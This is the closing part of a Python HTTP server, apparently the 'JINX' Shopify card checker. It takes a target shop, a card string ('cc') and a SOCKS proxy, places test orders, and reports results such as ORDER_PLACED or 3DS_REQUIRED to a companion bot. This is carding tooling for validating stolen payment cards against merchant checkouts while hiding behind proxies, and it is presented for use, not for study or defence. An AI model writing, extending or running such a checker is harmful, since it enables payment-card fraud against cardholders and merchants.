            "Price": "-",
            "Gateway": "Unknown",
        }

    code, label, is_ok = parse_result(r)

    price = "0.00"
    if bot and bot.product:
        try:
            price = f"{bot.product['price']:.2f}"
        except Exception:
            pass

    gateway = "Shopify"
    if is_ok:
        gateway = "Shopify Payments"

    # Build response text for bot.py
    if is_ok:
        response_text = "ORDER_PLACED"
    elif code == "OTP_REQUIRED":
        response_text = "3DS_REQUIRED"
    elif code == "FAILED":
        response_text = r.get("reason", "FAILED")
    elif code == "UNKNOWN":
        response_text = "UNKNOWN"
    else:
        response_text = code or "UNKNOWN"

    return {
        "Response": response_text,
        "Price": price,
        "Gateway": gateway,
        "code": code,
        "label": label,
        "success": bool(is_ok),
        "site": site,
    }


# ============================================================
# HTTP HANDLER
# ============================================================
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send_json(self, status, payload):
        try:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type, X-API-Key")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            pass
        except Exception:
            pass

    def log_message(self, fmt, *args):
        sys.stderr.write(f"[{BRAND.lower()}-api] " + (fmt % args) + "\n")

    def do_OPTIONS(self):
        self._send_json(200, {"ok": True})

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if path in ("/", "/health"):
            self._send_json(200, {
                "status": "ok",
                "service": f"{BRAND.lower()}-api",
                "version": VERSION,
                "socks_support": HAS_SOCKS,
                "endpoints": ["/Shopify", "/shopify", "/health"],
            })
            return

        if path.lower() in ("/shopify", "/shopify/"):
            site = (qs.get("site", [""])[0] or "").strip()
            cc = (qs.get("cc", [""])[0] or "").strip()
            proxy = (qs.get("proxy", [""])[0] or "").strip()

            if not site or not cc:
                self._send_json(400, {
                    "Response": "MISSING_PARAMS",
                    "Price": "-",
                    "Gateway": "Unknown",
                })
                return

            try:
                result = run_check(site, cc, proxy or None)
                self._send_json(200, result)
            except Exception as e:
                self._send_json(500, {
                    "Response": f"SERVER_ERROR: {str(e)[:80]}",
                    "Price": "-",
                    "Gateway": "Unknown",
                })
            return

        self._send_json(404, {"error": "not found", "path": path, "brand": BRAND})

    def do_POST(self):
        self.do_GET()


# ============================================================
# SERVER
# ============================================================
def main():
    try:
        _init_db()
    except Exception as e:
        print(f"⚠️ DB init warning: {e}")

    host = os.environ.get("JINX_HOST", "0.0.0.0")
    port = int(os.environ.get("JINX_PORT", "8080"))

    socks_status = "✅ available" if HAS_SOCKS else "❌ install PySocks"
    if not HAS_SOCKS:
        print("  ⚠️  SOCKS support: pip install PySocks")

    server = ThreadingHTTPServer((host, port), Handler)

    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print(f"║  {BRAND} API — Shopify Card Checker (v{VERSION})              ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"  Listening : http://{host}:{port}")
    print(f"  SOCKS     : {socks_status}")
    print(f"  Price     : ${PRICE_MIN} - ${PRICE_MAX} (mid-range)")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n  Shutting down {BRAND} API...")
        server.shutdown()


if __name__ == "__main__":
    main()
